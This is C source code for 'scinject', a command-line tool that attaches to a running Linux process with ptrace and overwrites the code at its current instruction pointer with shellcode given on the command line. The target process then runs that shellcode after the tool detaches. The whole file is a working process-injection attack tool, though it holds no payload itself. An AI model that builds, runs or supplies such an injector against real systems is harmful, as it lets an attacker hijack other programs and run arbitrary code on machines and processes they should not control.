#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

void convertShellcode(char *shellcodeString, unsigned char *shellcode) {
  int length = strlen(shellcodeString);
  int i = 2;
  int k = 0;
  // we can define it as 3 because it always contains 2 digits + null terminator
  // (Added null terminator just in case)
  char *ch = malloc(3 * sizeof(char));
  if (ch == NULL) {
    return;
  }

  while (i < length) {
    ch[0] = shellcodeString[i];
    ch[1] = shellcodeString[i + 1];
    ch[2] = '\x0';
    i += 4;

    int value = (int)strtol(ch, NULL, 16);
    shellcode[k] = (unsigned char)value;
    k++;
  }
  free(ch);
}

void printUsage(void) {
  printf("\033[0;34m[?] => USAGE: scinject --pid PID --shellcode "
         "\"\\x42\\x42\\x42\"\033[0m\n");
}

int main(int argc, char *argv[]) {
  if (argc < 5) {
    printf("\033[0;31m[X] >>> Insufficient number of arguments.\033[0m\n");
    printUsage();
    return -1;
  }

  pid_t pid;
  char *shellcodeString;

  bool pidSet = false;
  bool shellcodeSet = false;

  for (int i = 0; i < argc - 1; i++) {
    if (!strcmp(argv[i], "--pid") || !strcmp(argv[i], "-p")) {
      pidSet = true;
      char *end;
      pid = strtol(argv[i + 1], &end, 10);
    } else if (!strcmp(argv[i], "--shellcode") || !strcmp(argv[i], "-s")) {
      shellcodeSet = true;
      shellcodeString = argv[i + 1];
    }
  }

  if (pidSet == false) {
    printf("\033[0;31m[X] >>> Missing PID.\033[0m\n");
    printUsage();
    return -2;
  }

  if (shellcodeSet == false) {
    printf("\033[0;31m[X] >>> Missing shellcode.\033[0m\n");
    printUsage();
    return -3;
  }

  size_t shellcodeSize = strlen(shellcodeString) / 4;
  unsigned char shellcode[shellcodeSize];
  convertShellcode(shellcodeString, shellcode);

  struct user_regs_struct userRegs;

  if (ptrace(PTRACE_ATTACH, pid, NULL, 0) < 0) {
    printf("\033[0;31m[X] >>> Failed to attach.\033[0m\n");
    return -4;
  }

  wait(NULL);

  if (ptrace(PTRACE_GETREGS, pid, 0, &userRegs) < 0) {
    printf("\033[0;31m[X] >>> Failed to get registers.\033[0m\n");
    return -5;
  }

  for (size_t i = 0; i < shellcodeSize; i++) {
    ptrace(PTRACE_POKETEXT, pid, userRegs.rip + i, *(char *)(shellcode + i));
    printf("\r(\033[0;32mINJECTED BYTES\033[0m) -> [\033[34m%03ld\033[0m]", i);
    fflush(stdout);
  }

  ptrace(PTRACE_DETACH, pid, NULL, 0);
  printf("\n(\033[0;32mDEATCHED FROM PID\033[0m) -> [\033[34m%d\033[0m]\n",
         pid);

  return 0;
}
